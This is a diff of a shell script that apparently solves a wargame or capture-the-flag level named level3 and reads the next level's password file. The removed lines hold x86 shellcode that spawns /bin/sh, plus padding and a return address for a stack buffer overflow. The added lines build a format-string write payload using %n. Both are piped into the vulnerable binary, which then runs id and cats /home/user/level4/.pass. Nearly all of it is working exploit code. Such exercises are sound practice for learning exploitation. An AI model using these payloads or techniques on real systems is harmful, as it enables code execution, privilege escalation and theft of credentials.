@@ -4,13 +4,13 @@ GETPASS="cat /home/user/level4/.pass"
 
 set -x
 
-SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
-PADDING=`python -c 'print("A" * 52)'` # OFFSET=80 - SHELLCODE_LENGTH=28
-RETADDRESS="\x08\xa0\x04\x08"
+WRITE_ADDRESS="\x8c\x98\x04\x08"
+PADDING="%60x"
+WRITE_MODIFIER='%4$n'
 
-echo -e "${SHELLCODE}${PADDING}${RETADDRESS}" > /tmp/exploit
+python -c "print('$WRITE_ADDRESS' + '$PADDING' + '$WRITE_MODIFIER')" > /tmp/exploit3
 
-(cat /tmp/exploit - | ~/level3) << EOI
+(cat /tmp/exploit3 - | ~/level3) << EOI
     echo "\nid: \$(id)"
     echo "Next pass is:  \$($GETPASS)\n"
 EOI
